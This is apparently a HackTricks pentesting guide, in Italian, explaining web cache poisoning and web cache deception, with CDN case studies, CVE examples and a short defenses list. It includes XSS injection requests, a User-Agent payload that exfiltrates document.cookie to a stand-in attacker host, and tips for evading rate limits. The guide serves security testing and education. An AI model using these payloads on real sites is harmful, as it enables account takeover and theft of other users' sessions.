# Cache Poisoning e Cache Deception

{{#include ../../banners/hacktricks-training.md}}

## La differenza

> **Qual è la differenza tra web cache poisoning e web cache deception?**
>
> - Nel **web cache poisoning**, l'attaccante costringe l'applicazione a memorizzare contenuti dannosi nella cache, e questi contenuti vengono serviti dalla cache ad altri utenti dell'applicazione.
> - Nella **web cache deception**, l'attaccante costringe l'applicazione a memorizzare contenuti sensibili appartenenti a un altro utente nella cache, e l'attaccante poi recupera questi contenuti dalla cache.

## Cache Poisoning

Il cache poisoning mira a manipolare la cache lato client per costringere i client a caricare risorse che sono inaspettate, parziali o sotto il controllo di un attaccante. L'estensione dell'impatto dipende dalla popolarità della pagina interessata, poiché la risposta contaminata viene servita esclusivamente agli utenti che visitano la pagina durante il periodo di contaminazione della cache.

L'esecuzione di un attacco di cache poisoning comporta diversi passaggi:

1. **Identificazione degli Input Non Chiave**: Questi sono parametri che, sebbene non necessari affinché una richiesta venga memorizzata nella cache, possono alterare la risposta restituita dal server. Identificare questi input è cruciale poiché possono essere sfruttati per manipolare la cache.
2. **Sfruttamento degli Input Non Chiave**: Dopo aver identificato gli input non chiave, il passo successivo consiste nel capire come abusare di questi parametri per modificare la risposta del server in un modo che avvantaggi l'attaccante.
3. **Assicurarsi che la Risposta Contaminata sia Memorizzata nella Cache**: L'ultimo passo è garantire che la risposta manipolata sia memorizzata nella cache. In questo modo, qualsiasi utente che accede alla pagina interessata mentre la cache è contaminata riceverà la risposta contaminata.

### Scoperta: Controlla le intestazioni HTTP

Di solito, quando una risposta è stata **memorizzata nella cache**, ci sarà un **intestazione che lo indica**, puoi controllare quali intestazioni a cui prestare attenzione in questo post: [**HTTP Cache headers**](../../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Scoperta: Codici di errore di caching

Se pensi che la risposta venga memorizzata in una cache, potresti provare a **inviare richieste con un'intestazione errata**, a cui dovrebbe essere risposto con un **codice di stato 400**. Poi prova ad accedere alla richiesta normalmente e se la **risposta è un codice di stato 400**, sai che è vulnerabile (e potresti persino eseguire un DoS).

Puoi trovare ulteriori opzioni in:

{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

Tuttavia, nota che **a volte questi tipi di codici di stato non vengono memorizzati nella cache**, quindi questo test potrebbe non essere affidabile.

### Scoperta: Identificare e valutare gli input non chiave

Potresti usare [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) per **forzare parametri e intestazioni** che potrebbero **cambiare la risposta della pagina**. Ad esempio, una pagina potrebbe utilizzare l'intestazione `X-Forwarded-For` per indicare al client di caricare lo script da lì:
```html
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Elicitare una risposta dannosa dal server back-end

Con il parametro/intestazione identificato, controlla come viene **sanitizzato** e **dove** viene **riflesso** o influisce sulla risposta dall'intestazione. Puoi abusarne in qualche modo (eseguire un XSS o caricare un codice JS controllato da te? eseguire un DoS?...)

### Ottenere la risposta memorizzata nella cache

Una volta che hai **identificato** la **pagina** che può essere abusata, quale **parametro**/**intestazione** utilizzare e **come** abusarne, devi ottenere la pagina memorizzata nella cache. A seconda della risorsa che stai cercando di memorizzare nella cache, questo potrebbe richiedere del tempo, potresti dover provare per diversi secondi.

L'intestazione **`X-Cache`** nella risposta potrebbe essere molto utile poiché potrebbe avere il valore **`miss`** quando la richiesta non è stata memorizzata nella cache e il valore **`hit`** quando è memorizzata.\
L'intestazione **`Cache-Control`** è anche interessante per sapere se una risorsa viene memorizzata nella cache e quando sarà la prossima volta che la risorsa verrà memorizzata di nuovo: `Cache-Control: public, max-age=1800`

Un'altra intestazione interessante è **`Vary`**. Questa intestazione è spesso utilizzata per **indicare intestazioni aggiuntive** che vengono trattate come **parte della chiave della cache** anche se normalmente non sono chiave. Pertanto, se l'utente conosce il `User-Agent` della vittima che sta prendendo di mira, può avvelenare la cache per gli utenti che utilizzano quel specifico `User-Agent`.

Un'altra intestazione relativa alla cache è **`Age`**. Definisce il tempo in secondi in cui l'oggetto è stato nella cache del proxy.

Quando memorizzi una richiesta nella cache, fai **attenzione alle intestazioni che usi** perché alcune di esse potrebbero essere **utilizzate in modo imprevisto** come **chiave** e la **vittima dovrà utilizzare quella stessa intestazione**. Testa sempre un Cache Poisoning con **diversi browser** per controllare se funziona.

## Esempi di sfruttamento

### Esempio più semplice

Un'intestazione come `X-Forwarded-For` viene riflessa nella risposta non sanitizzata.\
Puoi inviare un payload XSS di base e avvelenare la cache in modo che tutti coloro che accedono alla pagina saranno XSSati:
```html
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Nota che questo avvelenerà una richiesta a `/en?region=uk` e non a `/en`_

### Avvelenamento della cache per DoS


{{#ref}}
cache-poisoning-to-dos.md
{{#endref}}

### Avvelenamento della cache tramite CDN

In **[questo writeup](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html)** viene spiegato il seguente semplice scenario:

- Il CDN memorizzerà nella cache tutto ciò che si trova sotto `/share/`
- Il CDN NON decodificherà né normalizzerà `%2F..%2F`, pertanto, può essere utilizzato come **path traversal per accedere ad altre posizioni sensibili che verranno memorizzate nella cache** come `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123`
- Il server web DECODIFICHERÀ e NORMALIZZERÀ `%2F..%2F`, e risponderà con `/api/auth/session`, che **contiene il token di autenticazione**.

### Utilizzare l'avvelenamento della cache web per sfruttare vulnerabilità nella gestione dei cookie

I cookie potrebbero anche essere riflessi nella risposta di una pagina. Se puoi abusarne per causare un XSS, ad esempio, potresti essere in grado di sfruttare XSS in diversi client che caricano la risposta della cache malevola.
```html
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
Nota che se il cookie vulnerabile è molto utilizzato dagli utenti, le richieste regolari puliranno la cache.

### Generating discrepancies with delimiters, normalization and dots <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

Controlla:

{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Cache poisoning with path traversal to steal API key <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Questo writeup spiega**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) come sia stato possibile rubare una chiave API di OpenAI con un URL come `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` perché qualsiasi cosa che corrisponde a `/share/*` sarà memorizzata nella cache senza che Cloudflare normalizzi l'URL, cosa che è stata fatta quando la richiesta ha raggiunto il server web.

Questo è spiegato meglio in:

{{#ref}}
cache-poisoning-via-url-discrepancies.md
{{#endref}}

### Using multiple headers to exploit web cache poisoning vulnerabilities <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

A volte sarà necessario **sfruttare diversi input non chiave** per poter abusare di una cache. Ad esempio, potresti trovare un **Open redirect** se imposti `X-Forwarded-Host` su un dominio controllato da te e `X-Forwarded-Scheme` su `http`. **Se** il **server** sta **inoltrando** tutte le **richieste HTTP** **a HTTPS** e utilizzando l'intestazione `X-Forwarded-Scheme` come nome di dominio per il reindirizzamento. Puoi controllare dove la pagina è puntata dal reindirizzamento.
```html
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Sfruttare con un header `Vary` limitato

Se hai scoperto che l'header **`X-Host`** viene utilizzato come **nome di dominio per caricare una risorsa JS** ma l'header **`Vary`** nella risposta indica **`User-Agent`**. Allora, devi trovare un modo per esfiltrare l'User-Agent della vittima e avvelenare la cache utilizzando quel user agent:
```html
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Fat Get

Invia una richiesta GET con la richiesta nell'URL e nel corpo. Se il server web utilizza quella del corpo ma il server cache memorizza quella dell'URL, chiunque acceda a quell'URL utilizzerà effettivamente il parametro del corpo. Come la vulnerabilità trovata da James Kettle sul sito di Github:
```
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```
C'è un laboratorio di portswigger su questo: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)

### Parameter Cloaking

Ad esempio, è possibile separare **parameters** nei server ruby utilizzando il carattere **`;`** invece di **`&`**. Questo potrebbe essere utilizzato per inserire valori di parametri non chiave all'interno di quelli chiave e abusarne.

Laboratorio Portswigger: [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)

### Exploiting HTTP Cache Poisoning by abusing HTTP Request Smuggling

Scopri qui come eseguire [Cache Poisoning attacks by abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Automated testing for Web Cache Poisoning

Il [Web Cache Vulnerability Scanner](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) può essere utilizzato per testare automaticamente il web cache poisoning. Supporta molte tecniche diverse ed è altamente personalizzabile.

Esempio di utilizzo: `wcvs -u example.com`

### Header-reflection XSS + CDN/WAF-assisted cache seeding (User-Agent, auto-cached .js)

Questo modello del mondo reale combina un primitivo di riflessione basato su header con il comportamento di CDN/WAF per avvelenare in modo affidabile l'HTML memorizzato nella cache servito ad altri utenti:

- L'HTML principale rifletteva un header di richiesta non attendibile (ad es., `User-Agent`) in un contesto eseguibile.
- Il CDN ha rimosso gli header di cache, ma esisteva una cache interna/origine. Il CDN ha anche memorizzato automaticamente le richieste che terminano in estensioni statiche (ad es., `.js`), mentre il WAF applicava un'ispezione dei contenuti più debole per le GET di asset statici.
- Le peculiarità del flusso di richiesta hanno permesso a una richiesta a un percorso `.js` di influenzare la chiave/variante della cache utilizzata per l'HTML principale successivo, abilitando XSS cross-user tramite riflessione dell'header.

Ricetta pratica (osservata su un popolare CDN/WAF):

1) Da un IP pulito (evitare downgrade basati sulla reputazione precedente), impostare un `User-Agent` malevolo tramite browser o Burp Proxy Match & Replace.
2) In Burp Repeater, preparare un gruppo di due richieste e utilizzare "Invia gruppo in parallelo" (la modalità a pacchetto singolo funziona meglio):
- Prima richiesta: GET un percorso di risorsa `.js` sulla stessa origine mentre si invia il proprio `User-Agent` malevolo.
- Immediatamente dopo: GET la pagina principale (`/`).
3) La corsa di instradamento CDN/WAF più il `.js` memorizzato automaticamente spesso semina una variante HTML memorizzata nella cache avvelenata che viene poi servita ad altri visitatori che condividono le stesse condizioni della chiave di cache (ad es., le stesse dimensioni `Vary` come `User-Agent`).

Esempio di payload dell'header (per esfiltrare cookie non HttpOnly):
```
User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
```
Operational tips:

- Molti CDN nascondono le intestazioni della cache; il poisoning può apparire solo su cicli di aggiornamento di diverse ore. Usa più IP di vantage e limita la velocità per evitare attivazioni di rate-limit o reputazione.
- Utilizzare un IP dal cloud del CDN stesso a volte migliora la coerenza del routing.
- Se è presente un CSP rigoroso, questo funziona ancora se il riflesso viene eseguito nel contesto HTML principale e il CSP consente l'esecuzione inline o viene bypassato dal contesto.

Impact:

- Se i cookie di sessione non sono `HttpOnly`, è possibile un ATO a zero clic estraendo in massa `document.cookie` da tutti gli utenti a cui viene servito l'HTML avvelenato.

Defenses:

- Smetti di riflettere le intestazioni delle richieste nell'HTML; codifica rigorosamente il contesto se inevitabile. Allinea le politiche di cache del CDN e dell'origine ed evita variazioni su intestazioni non affidabili.
- Assicurati che il WAF applichi l'ispezione dei contenuti in modo coerente alle richieste `.js` e ai percorsi statici.
- Imposta `HttpOnly` (e `Secure`, `SameSite`) sui cookie di sessione.

## Vulnerable Examples

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS ha inoltrato il frammento all'interno dell'URL senza rimuoverlo e ha generato la chiave di cache utilizzando solo l'host, il percorso e la query (ignorando il frammento). Quindi la richiesta `/#/../?r=javascript:alert(1)` è stata inviata al backend come `/#/../?r=javascript:alert(1)` e la chiave di cache non conteneva il payload al suo interno, solo host, percorso e query.

### GitHub CP-DoS

Inviare un valore errato nell'intestazione content-type ha attivato una risposta 405 memorizzata nella cache. La chiave di cache conteneva il cookie, quindi era possibile attaccare solo gli utenti non autenticati.

### GitLab + GCP CP-DoS

GitLab utilizza i bucket GCP per memorizzare contenuti statici. **I bucket GCP** supportano l'**intestazione `x-http-method-override`**. Quindi era possibile inviare l'intestazione `x-http-method-override: HEAD` e avvelenare la cache per restituire un corpo di risposta vuoto. Potrebbe anche supportare il metodo `PURGE`.

### Rack Middleware (Ruby on Rails)

Nelle applicazioni Ruby on Rails, il middleware Rack è spesso utilizzato. Lo scopo del codice Rack è prendere il valore dell'intestazione **`x-forwarded-scheme`** e impostarlo come schema della richiesta. Quando viene inviata l'intestazione `x-forwarded-scheme: http`, si verifica un reindirizzamento 301 alla stessa posizione, causando potenzialmente un Denial of Service (DoS) a quella risorsa. Inoltre, l'applicazione potrebbe riconoscere l'intestazione `X-forwarded-host` e reindirizzare gli utenti all'host specificato. Questo comportamento può portare al caricamento di file JavaScript dal server di un attaccante, ponendo un rischio per la sicurezza.

### 403 e Storage Buckets

Cloudflare in precedenza memorizzava nella cache le risposte 403. Tentare di accedere a S3 o Azure Storage Blobs con intestazioni di autorizzazione errate avrebbe comportato una risposta 403 che veniva memorizzata nella cache. Anche se Cloudflare ha smesso di memorizzare nella cache le risposte 403, questo comportamento potrebbe essere ancora presente in altri servizi proxy.

### Injecting Keyed Parameters

Le cache spesso includono parametri GET specifici nella chiave di cache. Ad esempio, il Varnish di Fastly memorizzava nella cache il parametro `size` nelle richieste. Tuttavia, se una versione codificata in URL del parametro (ad es., `siz%65`) veniva inviata con un valore errato, la chiave di cache sarebbe stata costruita utilizzando il corretto parametro `size`. Tuttavia, il backend avrebbe elaborato il valore nel parametro codificato in URL. La codifica in URL del secondo parametro `size` ha portato alla sua omissione da parte della cache ma al suo utilizzo da parte del backend. Assegnare un valore di 0 a questo parametro ha comportato un errore 400 Bad Request memorizzabile nella cache.

### User Agent Rules

Alcuni sviluppatori bloccano le richieste con user-agent che corrispondono a quelli di strumenti ad alto traffico come FFUF o Nuclei per gestire il carico del server. Ironia della sorte, questo approccio può introdurre vulnerabilità come il poisoning della cache e DoS.

### Illegal Header Fields

Il [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) specifica i caratteri accettabili nei nomi delle intestazioni. Le intestazioni contenenti caratteri al di fuori dell'intervallo **tchar** specificato dovrebbero idealmente attivare una risposta 400 Bad Request. In pratica, i server non sempre aderiscono a questo standard. Un esempio notevole è Akamai, che inoltra intestazioni con caratteri non validi e memorizza nella cache qualsiasi errore 400, purché l'intestazione `cache-control` non sia presente. È stato identificato un modello sfruttabile in cui l'invio di un'intestazione con un carattere illegale, come `\`, avrebbe comportato un errore 400 Bad Request memorizzabile nella cache.

### Finding new headers

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Cache Deception

L'obiettivo del Cache Deception è far sì che i client **carichino risorse che verranno salvate dalla cache con le loro informazioni sensibili**.

Prima di tutto, nota che le **estensioni** come `.css`, `.js`, `.png` ecc. sono solitamente **configurate** per essere **salvate** nella **cache.** Pertanto, se accedi a `www.example.com/profile.php/nonexistent.js`, la cache probabilmente memorizzerà la risposta perché vede l'**estensione** `.js`. Ma, se l'**applicazione** sta **riproducendo** i contenuti **sensibili** dell'utente memorizzati in _www.example.com/profile.php_, puoi **rubare** quei contenuti da altri utenti.

Altre cose da testare:

- _www.example.com/profile.php/.js_
- _www.example.com/profile.php/.css_
- _www.example.com/profile.php/test.js_
- _www.example.com/profile.php/../test.js_
- _www.example.com/profile.php/%2e%2e/test.js_
- _Usa estensioni meno conosciute come_ `.avif`

Un altro esempio molto chiaro può essere trovato in questo write-up: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
Nell'esempio, viene spiegato che se carichi una pagina non esistente come _http://www.example.com/home.php/non-existent.css_, il contenuto di _http://www.example.com/home.php_ (**con le informazioni sensibili dell'utente**) verrà restituito e il server della cache salverà il risultato.\
Poi, l'**attaccante** può accedere a _http://www.example.com/home.php/non-existent.css_ nel proprio browser e osservare le **informazioni riservate** degli utenti che hanno accesso prima.

Nota che il **cache proxy** dovrebbe essere **configurato** per **memorizzare** i file **basati** sull'**estensione** del file (_.css_) e non basato sul content-type. Nell'esempio _http://www.example.com/home.php/non-existent.css_ avrà un content-type `text/html` invece di un tipo MIME `text/css` (che è quello previsto per un file _.css_).

Learn here about how to perform[ Cache Deceptions attacks abusing HTTP Request Smuggling](../http-request-smuggling/index.html#using-http-request-smuggling-to-perform-web-cache-deception).

## Automatic Tools

- [**toxicache**](https://github.com/xhzeem/toxicache): scanner Golang per trovare vulnerabilità di poisoning della cache web in un elenco di URL e testare più tecniche di iniezione.

## References

- [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
- [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
- [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
- [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)
- [How I found a 0-Click Account takeover in a public BBP and leveraged it to access Admin-Level functionalities](https://hesar101.github.io/posts/How-I-found-a-0-Click-Account-takeover-in-a-public-BBP-and-leveraged-It-to-access-Admin-Level-functionalities/)
- [Burp Proxy Match & Replace](https://portswigger.net/burp/documentation/desktop/tools/proxy/match-and-replace)


{{#include ../../banners/hacktricks-training.md}}
